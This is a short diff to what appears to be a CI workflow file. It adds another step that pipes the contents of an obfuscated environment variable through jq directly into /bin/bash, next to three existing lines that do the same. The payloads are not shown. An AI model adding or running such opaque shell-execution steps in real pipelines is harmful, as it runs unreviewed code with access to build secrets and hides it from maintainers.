@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$tm65649" | jq -r .j736 | /bin/bash
           echo $xda0 | jq -r .mq06101 | /bin/bash
           echo $ufb7 | jq -r .z81 | /bin/bash
+          echo $pw90974 | jq -r .drutf400 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
